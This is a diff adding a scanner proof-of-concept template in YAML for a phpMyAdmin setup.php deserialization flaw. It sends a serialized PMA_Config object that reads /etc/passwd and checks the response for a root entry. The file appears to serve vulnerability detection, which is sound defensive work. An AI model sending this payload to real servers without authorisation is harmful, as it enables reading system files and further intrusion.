@@ -1,0 +1,21 @@
+id: poc-yaml-phpmyadmin-setup-deserialization
+info:
+  name: Phpmyadmin Setup 反序列化漏洞
+  severity: medium
+  tags:
+  - 反序列化
+  finger: phpMyAdmin
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: POST
+  path: /scripts/setup.php
+  headers: {}
+  data: action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && matches(body, "root:[x*]:0:0:")
+  output: []
